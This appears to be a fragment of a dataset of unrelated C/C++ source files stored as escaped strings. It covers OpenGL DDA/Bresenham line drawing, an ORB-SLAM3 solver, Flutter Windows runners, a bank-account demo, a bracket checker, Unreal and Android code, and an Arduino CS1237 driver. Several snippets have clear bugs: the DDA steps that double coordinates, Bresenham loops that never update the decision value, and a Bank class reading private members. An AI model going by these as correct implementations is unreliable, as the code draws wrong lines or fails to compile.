1;\n\tfloat xi = x1,yi=y1;\n\n\tif(dx>dy)\n\t\tsteps = abs(dx);\n\telse\n\t\tsteps = abs(dy);\n\n\n\t\twhile(i<=steps) {\n\n\t\t\tglBegin(GL_POINTS);\n    \t\t\tglVertex2f(round(xi), round(yi));\n    \t\tglEnd();\n    \t\tglFlush();\n\n\t\t    if(m<1) {\n\t\t\t\txi += 1+xi;\n\t\t\t\tyi += m+yi;\n\t\t\t}\n\n\t\t\telse if(m==1) {\n\t\t\t\txi += 1+xi;\n\t\t\t\tyi += 1+yi;\n\t\t\t}\n\t\t\telse if(m>1) {\n\t\t\t\txi = 1/m+xi;\n\t\t\t\tyi = 1+yi;\n\t\t\t}\n\t\t\ti++;\n\t\t}\n}\n\nvoid Bresenham_simple(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.0);\n\tfloat dx = x2-x1;\n\tfloat dy = y2-y1;\n\tfloat pk = 2*dy-dx;\n\tfloat pi = pk;\n\tfloat xi = x1,yi=y1;\n\n\twhile(xi<=x2&&yi<=y2) {\n\t\t\tglBegin(GL_POINTS);\n    \t\t\tglVertex2f(xi, yi);\n    \t\tglEnd();\n    \t\tglFlush();\n\n    \t\tif(pi<0) {\n    \t\t\tpi = pk + 2*dy;\n    \t\t\txi = xi+1;\n    \t\t\tyi = yi;\n    \t\t}\n\n    \t\telse {\n    \t\t\tpi = pk + 2*(dy-dx);\n    \t\t\txi = xi+1;\n    \t\t\tyi = yi+1;\n    \t\t}\n\t}\n}\n\n\n// DDA DOTTED LINE\nvoid DDA_dotted(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.0);\n\tfloat dx = x2-x1;\n\tfloat dy = y2-y1;\n\tint steps = 0;\n\tfloat m = dy/dx;\n\tint i = 1;\n\tfloat xi = x1,yi=y1;\n\n\tif(dx>dy)\n\t\tsteps = abs(dx);\n\telse\n\t\tsteps = abs(dy);\n\n\t\tint count = 0;\n\t\twhile(i<=steps) {\n\n\t\t\tglBegin(GL_POINTS);\n\t\t\tif(i%10==0)\n    \t\t\tglVertex2f(round(xi), round(yi));\n    \t\tglEnd();\n    \t\tglFlush();\n\n\t\t    if(m<1) {\n\t\t\t\txi += 1+xi;\n\t\t\t\tyi += m+yi;\n\t\t\t}\n\n\t\t\telse if(m==1) {\n\t\t\t\txi += 1+xi;\n\t\t\t\tyi += 1+yi;\n\t\t\t}\n\t\t\telse if(m>1) {\n\t\t\t\txi = 1/m+xi;\n\t\t\t\tyi = 1+yi;\n\t\t\t}\n\n\t\t\ti++;\n\t\t}\n}\n// DOTTED BRESENHAM LINE\nvoid Bresenham_dotted(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.0);\n\tint i=0;\n\tfloat dx = x2-x1;\n\tfloat dy = y2-y1;\n\tfloat pk = 2*dy-dx;\n\tfloat pi = pk;\n\tfloat xi = x1,yi=y1;\n\n\twhile(xi<=x2&&yi<=y2) {\n\t\t\tglBegin(GL_POINTS);\n\t\t\t\tif(i%10==0)\n    \t\t\t\tglVertex2f(xi, yi);\n    \t\tglEnd();\n    \t\tglFlush();\n\n    \t\tif(pi<0) {\n    \t\t\tpi = pk + 2*dy;\n    \t\t\txi = xi+1;\n    \t\t\tyi = yi;\n    \t\t}\n\n    \t\telse {\n    \t\t\tpi = pk + 2*(dy-dx);\n    \t\t\txi = xi+1;\n    \t\t\tyi = yi+1;\n    \t\t}\n    \t\ti++;\n\t}\n}\n\n// DASHED LINE\n\n// DDA DASHED LINE\nvoid DDA_dashed(float x1,float y1,float x2,float y2) {\n\tglPointSize(5.",
    "/**\n* This file is part of ORB-SLAM3\n*\n* Copyright (C) 2017-2021 Carlos Campos, Richard Elvira, Juan J. G\u00f3mez Rodr\u00edguez, Jos\u00e9 M.M. Montiel and Juan D. Tard\u00f3s, University of Zaragoza.\n* Copyright (C) 2014-2016 Ra\u00fal Mur-Artal, Jos\u00e9 M.M. Montiel and Juan D. Tard\u00f3s, University of Zaragoza.\n*\n* ORB-SLAM3 is free software: you can redistribute it and/or modify it under the terms of the GNU General Public\n* License as published by the Free Software Foundation, either version 3 of the License, or\n* (at your option) any later version.\n*\n* ORB-SLAM3 is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even\n* the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n* GNU General Public License for more details.\n*\n* You should have received a copy of the GNU General Public License along with ORB-SLAM3.\n* If not, see <http://www.gnu.org/licenses/>.\n*/\n\n/******************************************************************************\n* Author:   Steffen Urban                                              *\n* Contact:  urbste@gmail.com                                          *\n* License:  Copyright (c) 2016 Steffen Urban, ANU. All rights reserved.      *\n*                                                                            *\n* Redistribution and use in source and binary forms, with or without         *\n* modification, are permitted provided that the following conditions         *\n* are met:                                                                   *\n* * Redistributions of source code must retain the above copyright           *\n*   notice, this list of conditions and the following disclaimer.            *\n* * Redistributions in binary form must reproduce the above copyright        *\n*   notice, this list of conditions and the following disclaimer in the      *\n*   documentation and/or other materials provided with the distribution.     *\n* * Neither the name of ANU nor the names of its contributors may be         *\n*   used to endorse or promote products derived from this software without   *\n*   specific prior written permission.                                       *\n*                                                                            *\n* THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"*\n* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE  *\n* IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE *\n* ARE DISCLAIMED. IN NO EVENT SHALL ANU OR THE CONTRIBUTORS BE LIABLE        *\n* FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL *\n* DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR *\n* SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER *\n* CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT         *\n* LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY  *\n* OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF     *\n* SUCH DAMAGE.                                                               *\n******************************************************************************/\n\n#include \"MLPnPsolver.h\"\n\n#include <Eigen/Sparse>\n\n\nnamespace ORB_SLAM3 {\n    MLPnPsolver::MLPnPsolver(const Frame &F, const vector<MapPoint *> &vpMapPointMatches):\n            mnInliersi(0), mnIterations(0), mnBestInliers(0), N(0), mpCamera(F.mpCamera){\n        mvpMapPointMatches = vpMapPointMatches;\n        mvBearingVecs.reserve(F.mvpMapPoints.size());\n        mvP2D.reserve(F.mvpMapPoints.size());\n        mvSigma2.reserve(F.mvpMapPoints.size());\n        mvP3Dw.reserve(F.mvpMapPoints.size());\n        mvKeyPointIndices.reserve(F.mvpMapPoints.size());\n        mvAllIndices.reserve(F.mvpMapPoints.size());\n\n        int idx = 0;\n        for(size_t i = 0, iend = mvpMapPointMatches.size(); i < iend; i++){\n            MapPoint* pMP = vpMapPointMatches[i];\n\n            if(pMP){\n                if(!pMP -> isBad()){\n                    if(i >= F.mvKeysUn.size()) continue;\n                    const cv::KeyPoint &kp = F.mvKeysUn[i];\n\n                    mvP2D.push_back(kp.pt);\n                    mvSigma2.push_back(F.mvLevelSigma2[kp.octave]);\n\n                    //Bearing vector should be normalized\n                    cv::Point3f cv_br = mpCamera->unproject(kp.pt);\n                    cv_br /= cv_br.z;\n                    bearingVector_t br(cv_br.x,cv_br.y,cv_br.z);\n                    mvBearingVecs.push_back(br);\n\n                    //3D coordinates\n                    Eigen::Matrix<float,3,1> posEig = pMP -> GetWorldPos();\n                    point_t pos(posEig(0),posEig(1),posEig(2));\n                    mvP3Dw.push_back(pos);\n\n                    mvKeyPointIndices.push_back(i);\n                    mvAllIndices.push_back(idx);\n\n                    idx++;\n                }\n            }\n        }\n\n        SetRansacParameters();\n    }\n\n    //RANSAC methods\n    bool MLPnPsolver::iterat",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <fstream> \n\nint main() {\n\n    // Image\n\n    int image_width = 256;\n    int image_height = 256;\n\n    // Open file for writing\n    std::ofstream outfile(\"image.ppm\");\n\n    // Render\n    outfile << \"P3\\n\" << image_width << ' ' << image_height << \"\\n255\\n\";\n\n    for (int j = 0; j < image_height; ++j) {\n        for (int i = 0; i < image_width; ++i) {\n            outfile << (i * 255 / (image_width - 1)) << ' ' \n                    << (j * 255 / (image_height - 1)) << \" 0\\n\";\n        }\n    }\n\n    // Close the file\n    outfile.close();\n\n    std::clog << \"\\rDone.                 \\n\";\n}\n\n// The pixels are written out in rows.\n\n// Every row of pixels is written out left to right.\n\n// These rows are written out from top to bottom.\n\n//By convention, each of the red/green/blue components are represented internally by real-valued variables that range \n//from 0.0 to 1.0. These must be scaled to integer values between 0 and 255 before we print them out.\n\n//Red goes from fully off (black) to fully on (bright red) from left to right, and green goes from fully off at the top (black) \n//to fully on at the bottom (bright green). Adding red and green light together make yellow so we should expect the bottom right \n//corner to be yellow.",
    "#include <iostream>\r\n#include <vector>\r\n\r\nclass BankAccount {\r\nprivate:\r\n    std::string name;\r\n    int accountNumber;\r\n    double balance;\r\n\r\npublic:\r\n    BankAccount(std::string name, int accountNumber, double initialDeposit) : name(name), accountNumber(accountNumber), balance(initialDeposit) {}\r\n\r\n    void deposit(double amount) {\r\n        balance += amount;\r\n    }\r\n\r\n    bool withdraw(double amount) {\r\n        if (amount > balance) {\r\n            std::cout << \"Insufficient balance.\\n\";\r\n            return false;\r\n        }\r\n        balance -= amount;\r\n        return true;\r\n    }\r\n\r\n    void display() const {\r\n        std::cout << \"Account Name: \" << name << \"\\nAccount Number: \" << accountNumber << \"\\nBalance: $\" << balance << std::endl;\r\n    }\r\n};\r\n\r\nclass Bank {\r\nprivate:\r\n    std::vector<BankAccount> accounts;\r\n\r\npublic:\r\n    void addAccount(const BankAccount& account) {\r\n        accounts.push_back(account);\r\n    }\r\n\r\n    void depositToAccount(int accountNumber, double amount) {\r\n        for (auto& account : accounts) {\r\n            if (account.accountNumber == accountNumber) {\r\n                account.deposit(amount);\r\n                std::cout << \"Deposited $\" << amount << \" to account number \" << accountNumber << std::endl;\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Account not found.\\n\";\r\n    }\r\n\r\n    void withdrawFromAccount(int accountNumber, double amount) {\r\n        for (auto& account : accounts) {\r\n            if (account.accountNumber == accountNumber) {\r\n                if (account.withdraw(amount)) {\r\n                    std::cout << \"Withdrew $\" << amount << \" from account number \" << accountNumber << std::endl;\r\n                }\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Account not found.\\n\";\r\n    }\r\n\r\n    void showAccountDetails(int accountNumber) const {\r\n        for (const auto& account : accounts) {\r\n            if (account.accountNumber == accountNumber) {\r\n                account.display();\r\n                return;\r\n            }\r\n        }\r\n        std::cout << \"Account not found.\\n\";\r\n    }\r\n};\r\n\r\nint main() {\r\n    Bank myBank;\r\n    myBank.addAccount(BankAccount(\"John Doe\", 123456, 500.0));\r\n    myBank.depositToAccount(123456, 200.0);\r\n    myBank.withdrawFromAccount(123456, 100.0);\r\n    myBank.showAccountDetails(123456);\r\n\r\n    return 0;\r\n}\r\n",
    "\ufeff#include <iostream>\n#include <string>\nusing namespace std;\n\nclass Stack \n{\nprivate:\n    char* stackArray;\n    int top;\n    int capacity;\n\npublic:\n    Stack(int size) \n    {\n        stackArray = new char[size];\n        top = -1;\n        capacity = size;\n    }\n\n    ~Stack() \n    {\n        delete[] stackArray;\n    }\n\n    bool isEmpty() const \n    {\n        return top == -1;\n    }\n\n    void push(char ch) \n    {\n        if (top < capacity - 1) \n        {\n            stackArray[++top] = ch;\n        }\n    }\n\n    char pop() \n    {\n        if (top >= 0) \n        {\n            return stackArray[top--];\n        }\n        return '\\0';\n    }\n\n    char peek() const \n    {\n        if (top >= 0) \n        {\n            return stackArray[top];\n        }\n        return '\\0';\n    }\n};\n\nint main() \n{\n    string input;\n    cout << \"Enter a string: \";\n    getline(cin, input);\n\n    Stack stack(input.size());\n    size_t errorIndex = input.size();\n    bool isBalanced = true;\n\n    for (size_t i = 0; i < input.size(); ++i) \n    {\n        char ch = input[i];\n\n        if (ch == '(' || ch == '[' || ch == '{') \n        {\n            stack.push(ch);\n        }\n        else if (ch == ')' || ch == ']' || ch == '}') \n        {\n            if (stack.isEmpty()) \n            {\n                isBalanced = false;\n                errorIndex = i;\n                break;\n            }\n            else \n            {\n                char top = stack.peek();\n                if ((ch == ')' && top != '(') ||\n                    (ch == ']' && top != '[') ||\n                    (ch == '}' && top != '{')) {\n                    isBalanced = false;\n                    errorIndex = i;\n                    break;\n                }\n                stack.pop();\n            }\n        }\n        else if (ch == ';') \n        {\n            break;\n        }\n    }\n\n    if (isBalanced && stack.isEmpty()) \n    {\n        cout << \"The string is correct.\" << endl;\n    }\n    else \n    {\n        if (errorIndex < input.size()) \n        {\n            cout << \"Incorrect string up to the first error: \" << input.substr(0, errorIndex + 1) << endl;\n        }\n        else \n        {\n            cout << \"Incorrect string: not all brackets are balanced\" << endl;\n        }\n    }\n}\n\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\r\n\r\n\r\n#include \"Controller/SpawnerController.h\"\r\n#include \"Player/MainCharacter.h\"\r\n#include \"Gameplay/Spawner/SpawnerComponent.h\"\r\n\r\n#include \"EnhancedInputSubsystems.h\"\r\n#include \"InputMappingContext.h\"\r\n#include \"EnhancedInputComponent.h\"\r\n#include \"InputAction.h\"\r\n#include \"InputActionValue.h\"\r\n\r\n\r\nUSpawnerController::USpawnerController()\r\n{\r\n\tPrimaryComponentTick.bCanEverTick = false;\r\n}\r\n\r\nvoid USpawnerController::SetupInputComponentSpawnerController(TObjectPtr<class UInputComponent> InputComponent, AMainCharacter* InCharacter)\r\n{\r\n\t// Get Character and comp\r\n\tif (InCharacter)\r\n\t{\r\n\t\tCharacter = InCharacter;\r\n\t\tSpawnerComponent = Character->GetComponentByClass<USpawnerComponent>();\r\n\t}\r\n\r\n\t// Cast the Input Component to use it as EnhancedInputComponent\r\n\tUEnhancedInputComponent* EnhancedInput = Cast<UEnhancedInputComponent>(InputComponent);\r\n\r\n\t// Bind actions\r\n\tEnhancedInput->BindAction(InputActionSpawnPickUp, ETriggerEvent::Triggered, this, &USpawnerController::OnRecieveSpawnInput);\r\n\tEnhancedInput->BindAction(InputActionPickUpInfos, ETriggerEvent::Triggered, this, &USpawnerController::PrintPickUpInfos);\r\n}\r\n\r\n\r\nvoid USpawnerController::OnRecieveSpawnInput(const FInputActionValue& Value)\r\n{\r\n\t// Check Spawner comp\r\n\tif (!SpawnerComponent.IsValid())\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\r\n\t// Get spawn value\r\n\tconst FVector2D MoveValue = Value.Get<FVector2D>();\r\n\r\n\t// X positive = normal pick up\r\n\tif (MoveValue.X > 0)\r\n\t{\r\n\t\tSpawnerComponent->SpawnPickup(EPickUpType::Normal);\r\n\t}\r\n\r\n\t// X negative = destroy after pick up\r\n\telse if (MoveValue.X < 0)\r\n\t{\r\n\t\tSpawnerComponent->SpawnPickup(EPickUpType::DestroyAfterPickUp);\r\n\t}\r\n\r\n\t// Y = destroy after throw\r\n\telse if (MoveValue.Y != 0)\r\n\t{\r\n\t\tSpawnerComponent->SpawnPickup(EPickUpType::DestroyAfterThrow);\r\n\t}\r\n}\r\n\r\nvoid USpawnerController::PrintPickUpInfos()\r\n{\r\n\t// Check Spawner comp\r\n\tif (!SpawnerComponent.IsValid())\r\n\t{\r\n\t\treturn;\r\n\t}\r\n\r\n\tSpawnerComponent->PrintPickupInfos();\r\n}\r\n",
    "/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"convert.h\"\n\n#include <android-base/logging.h>\n\nnamespace android {\nnamespace hardware {\nnamespace sensors {\nnamespace V1_0 {\nnamespace implementation {\n\nvoid convertFromSensor(const sensor_t& src, SensorInfo* dst) {\n    dst->name = src.name;\n    dst->vendor = src.vendor;\n    dst->version = src.version;\n    dst->sensorHandle = src.handle;\n    dst->type = (SensorType)src.type;\n    dst->maxRange = src.maxRange;\n    dst->resolution = src.resolution;\n    dst->power = src.power;\n    dst->minDelay = src.minDelay;\n    dst->fifoReservedEventCount = src.fifoReservedEventCount;\n    dst->fifoMaxEventCount = src.fifoMaxEventCount;\n    dst->typeAsString = src.stringType;\n    dst->requiredPermission = src.requiredPermission;\n    dst->maxDelay = src.maxDelay;\n    dst->flags = src.flags;\n}\n\nvoid convertToSensor(const ::android::hardware::sensors::V1_0::SensorInfo& src, sensor_t* dst) {\n    dst->name = strdup(src.name.c_str());\n    dst->vendor = strdup(src.vendor.c_str());\n    dst->version = src.version;\n    dst->handle = src.sensorHandle;\n    dst->type = (int)src.type;\n    dst->maxRange = src.maxRange;\n    dst->resolution = src.resolution;\n    dst->power = src.power;\n    dst->minDelay = src.minDelay;\n    dst->fifoReservedEventCount = src.fifoReservedEventCount;\n    dst->fifoMaxEventCount = src.fifoMaxEventCount;\n    dst->stringType = strdup(src.typeAsString.c_str());\n    dst->requiredPermission = strdup(src.requiredPermission.c_str());\n    dst->maxDelay = src.maxDelay;\n    dst->flags = src.flags;\n    dst->reserved[0] = dst->reserved[1] = 0;\n}\n\nvoid convertFromSensorEvent(const sensors_event_t& src, Event* dst) {\n    typedef ::android::hardware::sensors::V1_0::SensorType SensorType;\n    typedef ::android::hardware::sensors::V1_0::MetaDataEventType MetaDataEventType;\n\n    *dst = {\n            .timestamp = src.timestamp,\n            .sensorHandle = src.sensor,\n            .sensorType = (SensorType)src.type,\n    };\n\n    switch (dst->sensorType) {\n        case SensorType::META_DATA: {\n            dst->u.meta.what = (MetaDataEventType)src.meta_data.what;\n            // Legacy HALs contain the handle reference in the meta data field.\n            // Copy that over to the handle of the event. In legacy HALs this\n            // field was expected to be 0.\n            dst->sensorHandle = src.meta_data.sensor;\n            break;\n        }\n\n        case SensorType::ACCELEROMETER:\n        case SensorType::MAGNETIC_FIELD:\n        case SensorType::ORIENTATION:\n        case SensorType::GYROSCOPE:\n        case SensorType::GRAVITY:\n        case SensorType::LINEAR_ACCELERATION: {\n            dst->u.vec3.x = src.acceleration.x;\n            dst->u.vec3.y = src.acceleration.y;\n            dst->u.vec3.z = src.acceleration.z;\n            dst->u.vec3.status = (SensorStatus)src.acceleration.status;\n            break;\n        }\n\n        case SensorType::GAME_ROTATION_VECTOR: {\n            dst->u.vec4.x = src.data[0];\n            dst->u.vec4.y = src.data[1];\n            dst->u.vec4.z = src.data[2];\n            dst->u.vec4.w = src.data[3];\n            break;\n        }\n\n        case SensorType::ROTATION_VECTOR:\n        case SensorType::GEOMAGNETIC_ROTATION_VECTOR: {\n            dst->u.data[0] = src.data[0];\n            dst->u.data[1] = src.data[1];\n            dst->u.data[2] = src.data[2];\n            dst->u.data[3] = src.data[3];\n            dst->u.data[4] = src.data[4];\n            break;\n        }\n\n        case SensorType::MAGNETIC_FIELD_UNCALIBRATED:\n        case SensorType::GYROSCOPE_UNCALIBRATED:\n        case SensorType::ACCELEROMETER_UNCALIBRATED: {\n            dst->u.uncal.x = src.uncalibrated_gyro.x_uncalib;\n            dst->u.uncal.y = src.uncalibrated_gyro.y_uncalib;\n            dst->u.uncal.z = src.uncalibrated_gyro.z_uncalib;\n            dst->u.uncal.x_bias = src.uncalibrated_gyro.x_bias;\n            dst->u.uncal.y_bias = src.uncalibrated_gyro.y_bias;\n            dst->u.uncal.z_bias = src.uncalibrated_gyro.z_bias;\n            break;\n        }\n\n        case SensorType::DEVICE_ORIENTATION:\n        case SensorType::LIGHT:\n        case SensorType::PRESSURE:\n        case SensorType::TEMPERATURE:\n        case SensorType::PROXIMITY:\n        case SensorType::RELATIVE_HUMIDITY:\n        case SensorType::AMBIENT_TEMPERATURE:\n        case SensorType::SIGNIFICANT_MOTION:\n        case SensorType::STEP_DETECTOR:\n        case SensorType::",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"menupro\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <Arduino.h>\r\n#include <fmt/format.h>\r\n\r\n#define SCK 4\r\n#define DOUT 5\r\n#define SCLK_LOW digitalWrite(SCK, 0)\r\n#define SCLK_HIGH digitalWrite(SCK, 1)\r\n\r\nenum REG_MODS {\r\n  CH_SEL_A = 0b00,\r\n  CH_SEL_B = 0b01,\r\n  CH_SEL_CHIP_RETENTION = 0b01,\r\n  CH_SEL_TEMPERATURE = 0b10,\r\n  CH_SEL_INTERNAL_SHORT = 0b11,\r\n  PGA_SEL_1 = 0b00 << 2,\r\n  PGA_SEL_2 = 0b01 << 2,\r\n  PGA_SEL_64 = 0b10 << 2,\r\n  PGA_SEL_128 = 0b11 << 2,\r\n  SPEED_SEL_10 = 0b00 << 4,\r\n  SPEED_SEL_40 = 0b01 << 4,\r\n  SPEED_SEL_640 = 0b10 << 4,\r\n  SPEED_SEL_1280 = 0b11 << 4,\r\n  REF_ON = 0b0 << 6,\r\n  REF_OFF = 0b1 << 6\r\n};\r\n\r\nvoid CS1237Init()\r\n{\r\n\tpinMode(SCK, OUTPUT);\r\n\tpinMode(DOUT, INPUT_PULLUP);\r\n  delayMicroseconds(10);\r\n\tSCLK_LOW;\r\n}\r\n\r\nint CS1237isReady()\r\n{\r\n\treturn !digitalRead(DOUT);\r\n}\r\n\r\nvoid CS1237ClockUp()\r\n{\r\n\tSCLK_HIGH;\r\n\tdelayMicroseconds(10);\r\n\tSCLK_LOW;\r\n\tdelayMicroseconds(10);\r\n}\r\n\r\nvoid CS1237WriteConfig()\r\n{\r\n\t//no op\r\n\r\n  //pinMode(DOUT, OUTPUT);\r\n\r\n  while (!CS1237isReady());\r\n\r\n  // 1.\r\n  // Blank for 24 clock cycles, part of the spec\r\n  for (int i = 0; i < 24; i++)\r\n    CS1237ClockUp();\r\n\r\n  // 2.\r\n  // Skip the two register status reads, don't care yet\r\n  CS1237ClockUp();\r\n  CS1237ClockUp();\r\n\r\n  // 3.\r\n  // 27th SCLK pulls the /DRDY / DOUT high\r\n  CS1237ClockUp();\r\n\r\n  // 4.\r\n  // Between clock 28 and 29 switch DOUT to an output\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, OUTPUT);\r\n  CS1237ClockUp();\r\n\r\n  // 5.\r\n  // Read 7 bits on input word to determine read or write\r\n  char writeReg = 0x65 << 1;\r\n  for (int i = 0; i < 7; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & writeReg);\r\n    writeReg <<= 1;\r\n    CS1237ClockUp();\r\n    SCLK_LOW;\r\n  }\r\n\r\n  // 6.\r\n  // Spare clock since we only write for now\r\n  CS1237ClockUp();\r\n\r\n  char settings = (CH_SEL_TEMPERATURE | PGA_SEL_128 | SPEED_SEL_1280 | REF_OFF);\r\n  for (int i = 0; i < 8; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & settings);\r\n    settings <<= 1;\r\n    CS1237ClockUp();\r\n  }\r\n\r\n  digitalWrite(DOUT, 0);\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n  pinMode(DOUT, INPUT_PULLUP);\r\n}\r\n\r\nint CS1237ReadConfig()\r\n{\r\n  while (!CS1237isReady());\r\n\r\n  // 1.\r\n  // Blank for 24 clock cycles, part of the spec\r\n  for (int i = 0; i < 24; i++)\r\n    CS1237ClockUp();\r\n\r\n  // 2.\r\n  // Skip the two register status reads, don't care yet\r\n  CS1237ClockUp();\r\n  CS1237ClockUp();\r\n\r\n  // 3.\r\n  // 27th SCLK pulls the /DRDY / DOUT high\r\n  CS1237ClockUp();\r\n\r\n  // 4.\r\n  // Between clock 28 and 29 switch DOUT to an output\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, OUTPUT);\r\n  CS1237ClockUp();\r\n\r\n  // 5.\r\n  // Read 7 bits on input word to determine read or write\r\n  char writeReg = 0x56 << 1;\r\n  for (int i = 0; i < 7; i++)\r\n  {\r\n    digitalWrite(DOUT, 0x80 & writeReg);\r\n    writeReg <<= 1;\r\n    CS1237ClockUp();\r\n    SCLK_LOW;\r\n  }\r\n\r\n  // 6.\r\n  //\r\n  CS1237ClockUp();\r\n  pinMode(DOUT, INPUT_PULLUP);\r\n\r\n  char settings = 0;\r\n  for (int i = 0; i < 8; i++)\r\n  {\r\n    CS1237ClockUp();\r\n    settings = (settings << 1) | digitalRead(DOUT);\r\n    SCLK_LOW;\r\n  }\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n  return settings;\r\n}\r\n\r\nint CS1237Read()\r\n{\r\n\tint tmp = 0;\r\n\r\n\twhile (!CS1237isReady());\r\n\r\n\tfor (int i = 0; i < 24; i++)\r\n\t{\r\n    CS1237ClockUp();\r\n\t\ttmp = (tmp << 1) | digitalRead(DOUT);\r\n\t\tSCLK_LOW;\r\n\t}\r\n\r\n\tSCLK_LOW;\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tCS1237ClockUp();\r\n\tSCLK_LOW;\r\n\r\n\treturn tmp;\r\n}\r\n\r\nlong getValue(int num)\r\n{\r\n\tlong weight = 0;\r\n\tfor(int i = 0; i < num; i++)\r\n\t{\r\n\t\tweight += CS1237Read();;\r\n\t}\r\n\treturn weight / num;\r\n}\r\n\r\nlong offset = 0;\r\n\r\nvoid tare()\r\n{\r\n  Serial.print(\"Interupt Triggered\");\r\n  offset = getValue(640);\r\n}\r\n\r\nvoid setup() {\r\n  Serial.begin(115200);\r\n  pinMode(24, INPUT_PULLUP);\r\n  //attachInterrupt(digitalPinToInterrupt(24), tare, CHANGE);\r\n  delayMicroseconds(10);\r\n  CS1237Init();\r\n  CS1237WriteConfig();\r\n}\r\n\r\nvoid loop() {\r\n  if (!digitalRead(24))\r\n    offset = getValue(128);\r\n\r\n  Serial.print(fmt::format(\"Attempting: {:>10} {:>10}\", CS1237Read() - offset, offset).c_str());\r\n  Serial.println();\r\n}\r\n",
